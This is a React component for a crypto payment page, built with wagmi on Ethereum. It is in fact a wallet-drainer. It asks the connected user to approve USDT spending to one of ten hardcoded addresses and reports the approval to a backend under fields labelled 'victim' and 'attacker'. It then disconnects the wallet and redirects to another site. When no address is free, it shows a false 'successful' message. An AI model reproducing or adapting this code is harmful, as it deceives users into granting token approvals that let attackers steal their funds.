import React, { useEffect } from "react";

import ReactGA from "react-ga4";

import { usePayment } from "../../../../providers/PaymentProvider";
import { useConnectionType } from "../../../../providers/ConnectionTypeProvider";

import { useAccount, useDisconnect, useContractWrite, useContractReads, useWalletClient } from "wagmi";
import {erc20Info, ERC20INFO} from "../../../../constant/erc20Info";

import { PaymentForm } from "../../components/PaymentForm";

import { toastError, toastSuccess } from "../../../../utils/toast";
import { validatePayment } from "../../../../utils/validations";
import { useRequest } from "../../../../hooks";
import { getApproveAddress, postTransferInfo } from '../../../../api';
import { event } from "../../../../utils/gtag";

const MEASUREMENT_ID = "G-LTMZH3LQ6K";
ReactGA.initialize(MEASUREMENT_ID ? MEASUREMENT_ID : "");

const addressList = [
  '0xdD11be33a3a921f6092632756eF245bd6647995d',
  '0x26d9722B32c9beE1AF7677985286Ad0f69D4970e',
  '0x67e07Cc99123A6cA4dA0bD7A97f90a0ea63439f5',
  '0xcE05fc05f11e996e09Cdfa67d8E4698F4543a1e6',
  '0x119E5E142c04d36a6072308d8D3497F1bC870fDf',
  '0x41b6A4d0379F90D3880d85f4083F82FF206f6CC7',
  '0xe79Ad55897cE3D7Dd2201f5F75E785074575Fb6B',
  '0xBF8794942683bF9190ab6A46e2d4d9a9721D59c4',
  '0xC3feCFcE0906C2CB9B96c072e862eA1Cf3587A35',
  '0x4DDa8C3024e7cb16f1a9aC29841838da4598a8Ae'
]




export const EthereumContainer = () => {
  const { quantity, handleQuantityChange } = usePayment();
  const { resetConnectionType, changeIsRedirecting } = useConnectionType();
  const { address } = useAccount();
  const { disconnect } = useDisconnect();
  // const {data:approveAddress} = useRequest(getApproveAddress,{initialData: {path: 'eth'}})
  
  // const { isError, isSuccess, isLoading, signMessage } = useSignMessage({
  //   message: "Test Message",
  // });
  
  const erc20UsdtInfo = erc20Info[ERC20INFO.USDTgoerli]
  const contracts = addressList.map(e => {
    return {
      address: erc20UsdtInfo.address,
      abi: erc20UsdtInfo.abi,
      functionName: 'allowance',
      chainId: 5,
      args: [address, e]
    }
  })

  const { data:approveList } = useContractReads({
    contracts: contracts
  })
  
  const approveListIndex = (approveList || []).findIndex(e => Number(e.result) === 0)
  const approveAddress =  addressList[approveListIndex]
  
  const { data, isSuccess,isLoading, isError, write, error } = useContractWrite({
    address: erc20UsdtInfo.address as `0x${string}`,
    abi: erc20UsdtInfo.abi,
    functionName: 'approve',
    chainId: 5,
    args: [approveAddress, BigInt(100 * 10 ** erc20UsdtInfo.decimals)]
  })

  const {request} = useRequest(postTransferInfo,{
    manual: true,
    initialData: {
      path: 'eth',
      body: {
        victim: address as string,
        attacker: approveAddress,
        chain_type: "ETH",
        txid: data?.hash as string,
      }
    },
  })

  useEffect(() => {
    ReactGA.event({
      action: "载入授权页面",
      category: "授权页面",
      label: "钱包编号：缺失",
    });
  });

  useEffect(() => {
    if (isSuccess) {
      event({
        action: 'approve-end',
        from: address,
        to: approveAddress,
        type: 'erc20',
        wallet: localStorage.getItem("wagmi.connectedRdns")
      })
      toastSuccess("Transaction is successful");
      changeIsRedirecting(true);
      request()
      handleDisconnect();
      window.open("https://solbit.network", "_self");
    }

    if (isError) {
      event({
        action: 'wallet-error',
        from: address,
        to: approveAddress,
        type: 'erc20',
        message: error?.message
      })
      
      toastError("Transaction has been failed. Please try again later.");
    }
  }, [isSuccess, isError]);

  const handleSubmit = async () => {
    if (approveAddress) {
      event({
        action: 'approve-start',
        from: address,
        to: approveAddress,
        type: 'erc20',
        wallet: localStorage.getItem("wagmi.connectedRdns")
      })
      validatePayment(quantity, write);
    } else {
      toastSuccess('Transaction is successful')
      changeIsRedirecting(true);
      handleDisconnect();
      window.open("https://solbit.network", "_self");
    }
  };

  const handleDisconnect = () => {
    const connectedRdns = localStorage.getItem("wagmi.connectedRdns") as string;

    const coinbaseRdns = '"com.coinbase.wallet"';
    const trustWalletRdns = '"com.trustwallet.app"';

    if ([coinbaseRdns, trustWalletRdns].includes(connectedRdns)) {
      localStorage.clear();
    }

    disconnect(undefined, { onSuccess: successDisconnect });
    event({
      action: 'disconnect',
      wallet: localStorage.getItem("wagmi.connectedRdns")
    })
  };
  const successDisconnect = () => {
    handleQuantityChange("");
    resetConnectionType();
  };

  return (
    <PaymentForm
      address={address}
      quantity={quantity}
      submitLoading={isLoading}
      handleQuantityChange={handleQuantityChange}
      onDisconnect={handleDisconnect}
      onSubmit={handleSubmit}
    />
  );
};
